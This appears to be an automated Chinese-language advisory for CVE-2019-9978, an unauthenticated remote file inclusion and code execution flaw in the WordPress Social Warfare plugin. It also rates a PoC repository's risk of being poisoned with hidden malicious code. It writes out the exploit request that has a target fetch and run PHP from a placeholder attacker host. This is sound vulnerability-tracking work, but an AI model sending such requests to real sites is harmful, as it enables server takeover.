## CVE-2019-9978 - WordPress Social Warfare Plugin RCE/RFI/XSS

**漏洞编号:** CVE-2019-9978

**漏洞类型:** RCE/RFI/XSS

**影响应用:** WordPress Social Warfare Plugin

**危害等级:** Critical

**CVSS评分:** 9.8

**影响版本:** ≤ 3.5.2

**利用条件:** 无需认证，远程网络访问

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2019-9978是一个存在于WordPress Social Warfare插件（版本3.5.2及更早版本）中的严重安全漏洞。该漏洞源于插件在处理wp-admin/admin-post.php中的swp_debug参数时，未能对用户输入的swp_url参数进行有效的验证和过滤。攻击者可以通过构造特殊的HTTP请求，诱导服务器包含并执行远程攻击者控制的恶意PHP脚本或文本文件，从而实现远程代码执行（RCE）。该漏洞的POC有效性极高，因为它直接利用了PHP的远程文件包含特性，只需目标环境开启了allow_url_include配置（或通过特定技巧绕过），即可通过单个未授权请求完成攻击流程。利用步骤如下：首先，攻击者在受控服务器上准备一个包含PHP恶意代码的文件（如payload.txt）；接着，攻击者发送请求至目标站点，URL格式通常为 /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://attacker/payload.txt；随后，目标服务器下载并解析执行该远程文件，攻击者由此获取WebShell或直接执行任意系统命令。此漏洞因其无须认证、利用链条短、影响范围广而被评估为高危。

关于该POC的投毒风险分析，本项目的代码库表现出较低的风险特征。代码逻辑主要使用Python的requests库来构建HTTP请求，利用步骤清晰，且README文档详尽，符合安全研究和渗透测试的规范。经过静态分析，POC脚本中未发现代码混淆、非法外部连接、Base64编码的隐藏payload或对本地敏感文件（如/etc/shadow）的静默上传行为。虽然该漏洞本身涉及加载外部远程负载，但在POC语境下，该远程负载由测试者自行定义（如http://attacker-ip:8000/payload-main.txt），属于预期的实验行为而非恶意后门植入。脚本未包含eval()执行非预期代码的逻辑，也没有发现针对研究员主机的破坏性命令（如rm -rf /）。然而，考虑到此类高价值RCE工具常被脚本小子或攻击者利用，仍需警惕在其他非受信渠道下载的变体脚本中可能被插入的恶意代码。当前的POC项目在防御性研究中是安全的，投毒风险评定为10%，属于极低范围。

**项目地址:** /tmp/vulnwatchdog_c21a1a8ecd74c02fa825bd8deffb172823/

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2019-9978](https://nvd.nist.gov/vuln/detail/CVE-2019-9978)
